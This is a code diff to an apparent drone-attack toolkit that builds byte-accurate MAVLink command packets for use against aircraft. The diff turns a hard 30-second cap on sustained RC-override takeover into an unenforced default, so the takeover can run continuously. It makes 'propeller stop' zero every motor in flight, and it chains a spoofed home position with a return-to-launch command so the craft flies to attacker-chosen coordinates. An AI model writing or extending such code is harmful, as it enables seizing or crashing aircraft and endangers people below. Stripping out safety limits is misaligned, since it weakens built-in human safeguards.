@@ -85,8 +85,17 @@ MAV_CMD = {
 # re-declaring them.
 # =====================================================================
 
-# Hard cap on the sustained RC_CHANNELS_OVERRIDE controlled-landing window.
-# Bounded engagement, NEVER transmit-forever.
+# Reference/default engagement window for the sustained RC_CHANNELS_OVERRIDE
+# controlled-landing (PL-011). Commander directive (mirrors the jam-path
+# decision): this is NO LONGER an artificial HARD cap. The window is
+# OPERATOR-CONTROLLED — honored verbatim, allowed to run long, or run
+# continuous-until-stop (see run_sustained_takeover's continuous flag). The
+# REAL safety is not a wall-clock ceiling but (a) the operator kill-switch —
+# EMERGENCY ABORT / tx_halt / range-auth-off terminate the stream within one
+# frame period, and (b) the end-of-window / graceful-stop NEUTRAL-RELEASE burst
+# that hands control back to the craft. This constant is retained only as a
+# non-binding default reference value (e.g. the spec's advertised default
+# window) — it is not enforced as a limit anywhere.
 MANEUVER_TAKEOVER_MAX_DURATION_S = 30.0
 
 # Link protocols against which RC_CHANNELS_OVERRIDE (msg 70) is a NO-OP
@@ -268,6 +277,52 @@ def describe_packet(frame: bytes) -> Dict:
     return {"valid": False, "reason": "unknown STX or short frame"}
 
 
+def iter_frames(blob: bytes) -> List[bytes]:
+    """Split a byte blob containing one or more back-to-back MAVLink v1/v2 frames
+    into the individual frames. Multi-command payloads (PL-008 spoof-home+RTH,
+    PL-005 per-motor DO_MOTOR_TEST) put several frames on the wire in sequence;
+    this reverses that so each frame can be inspected/decoded independently.
+
+    Frame length is derived from the header LEN field (v2: STX,LEN(1),incompat,
+    compat,seq,sysid,compid + 3-byte msgid + LEN payload + 2-byte CRC = 12+LEN;
+    v1: 6-byte header + LEN payload + 2-byte CRC = 8+LEN). Stops at the first
+    byte that is not a recognized STX."""
+    frames: List[bytes] = []
+    i = 0
+    n = len(blob)
+    while i < n:
+        stx = blob[i]
+        if stx == MAVLINK_STX_V2 and i + 1 < n:
+            total = 12 + blob[i + 1]
+        elif stx == MAVLINK_STX_V1 and i + 1 < n:
+            total = 8 + blob[i + 1]
+        else:
+            break
+        if i + total > n:
+            break
+        frames.append(blob[i:i + total])
+        i += total
+    return frames
+
+
+def decode_command_long(frame: bytes) -> Dict:
+    """Round-trip decoder for a COMMAND_LONG (msgid=76) frame: recovers the seven
+    float params + command id + target ids. Used to assert byte-accurate content
+    (e.g. PL-008's spoofed lat/lon, PL-005's per-motor number). Zero-pads a
+    v2-trimmed payload back to the full 33 bytes before unpacking."""
+    payload = _payload_from_frame(frame).ljust(33, b"\x00")[:33]
+    (p1, p2, p3, p4, p5, p6, p7, command, target_system, target_component,
+     confirmation) = struct.unpack("<fffffffHBBB", payload)
+    return {
+        "command": command,
+        "target_system": target_system,
+        "target_component": target_component,
+        "confirmation": confirmation,
+        "param1": p1, "param2": p2, "param3": p3, "param4": p4,
+        "param5": p5, "param6": p6, "param7": p7,
+    }
+
+
 # ---- Named packet builders for the payload library ----
 def payload_force_land(target_sys: int, target_comp: int = 1, seq: int = 0) -> bytes:
     p = build_command_long_payload(target_sys, target_comp, MAV_CMD["NAV_LAND"])
@@ -291,11 +346,33 @@ def payload_flight_termination(target_sys: int, target_comp: int = 1, seq: int =
     return build_packet_v2(76, p, sequence=seq)
 
 
-def payload_propeller_stop(target_sys: int, target_comp: int = 1, seq: int = 0) -> bytes:
-    # DO_MOTOR_TEST: param1=motor#, param2=0 (percent), param3=0 throttle, param4=timeout
-    p = build_command_long_payload(target_sys, target_comp, MAV_CMD["DO_MOTOR_TEST"],
-                                   param1=1.0, param2=0.0, param3=0.0, param4=1.0)
-    return build_packet_v2(76, p, sequence=seq)
+# Physical rotor-count bound for PROPELLER STOP (PL-005). This is a genuine
+# airframe limit, not an artificial cap: common multirotors are 3-8 rotors
+# (tri/quad/hexa/octo). motor_count is operator-settable within [1, 8]; a value
+# outside is clamped to this real range rather than rejected.
+PROPELLER_STOP_MIN_MOTORS = 1
+PROPELLER_STOP_MAX_MOTORS = 8
+
+
+def payload_propeller_stop(target_sys: int, target_comp: int = 1, seq: int = 0,
+                           motor_count: int = 4) -> bytes:
+    """Drive ALL rotors to 0% RPM by iterating MAV_CMD_DO_MOTOR_TEST (throttle=0)
+    across every motor 1..motor_count, not just motor #1 (matches the PL-005
+    "all motors" catalog claim). Returns the N byte-accurate COMMAND_LONG frames
+    back-to-back, exactly as a GCS would put a motor-test sequence on the wire.
+
+    motor_count is operator-settable and clamped to the real airframe range
+    [PROPELLER_STOP_MIN_MOTORS, PROPELLER_STOP_MAX_MOTORS]."""
+    n = max(PROPELLER_STOP_MIN_MOTORS,
+            min(int(motor_count), PROPELLER_STOP_MAX_MOTORS))
+    frames = b""
+    for i in range(n):
+        # DO_MOTOR_TEST: param1=motor# (1-indexed), param2=0 (MOTOR_TEST_THROTTLE_PERCENT),
+        # param3=0 throttle, param4=1 timeout(s), param5=motor count (0=default).
+        p = build_command_long_payload(target_sys, target_comp, MAV_CMD["DO_MOTOR_TEST"],
+                                       param1=float(i + 1), param2=0.0, param3=0.0, param4=1.0)
+        frames += build_packet_v2(76, p, sequence=(seq + i) & 0xFF)
+    return frames
 
 
 def payload_memory_erase(target_sys: int, target_comp: int = 1, seq: int = 0) -> bytes:
@@ -315,10 +392,24 @@ def payload_reboot(target_sys: int, target_comp: int = 1, seq: int = 0) -> bytes
 
 def payload_rth_spoof_home(target_sys: int, target_comp: int = 1, seq: int = 0,
                             lat: float = 0.0, lon: float = 0.0, alt: float = 0.0) -> bytes:
-    # Injects a fake HOME_POSITION via DO_SET_HOME then triggers RTH.
-    p = build_command_long_payload(target_sys, target_comp, MAV_CMD["DO_SET_HOME"],
-                                   param1=0.0, param5=lat, param6=lon, param7=alt)
-    return build_packet_v2(76, p, sequence=seq)
+    """Spoof HOME to operator-chosen coordinates (DO_SET_HOME with param1=0 =>
+    'use the specified location', lat/lon in param5/param6, alt in param7) and
+    THEN trigger the return so the craft flies to the FALSE home — matching the
+    PL-008 "spoof home -> RTH to the false coords" description.
+
+    Returns the two byte-accurate frames back-to-back on the wire in order:
+      1. DO_SET_HOME (COMMAND_LONG 179) carrying the injected coordinates.
+      2. NAV_RETURN_TO_LAUNCH (COMMAND_LONG 20) — the RTH trigger.
+    This is exactly how a GCS would sequence the two commands; the field bridge
+    writes the concatenated bytes to the radio in one pass and the receiver
+    parses two messages. seq is used for the DO_SET_HOME frame and seq+1 for the
+    RTH trigger."""
+    set_home = build_command_long_payload(target_sys, target_comp, MAV_CMD["DO_SET_HOME"],
+                                          param1=0.0, param5=lat, param6=lon, param7=alt)
+    set_home_frame = build_packet_v2(76, set_home, sequence=seq & 0xFF)
+    rth = build_command_long_payload(target_sys, target_comp, MAV_CMD["NAV_RETURN_TO_LAUNCH"])
+    rth_frame = build_packet_v2(76, rth, sequence=(seq + 1) & 0xFF)
+    return set_home_frame + rth_frame
 
 
 def payload_gnss_denial(target_sys: int, target_comp: int = 1, seq: int = 0) -> bytes:
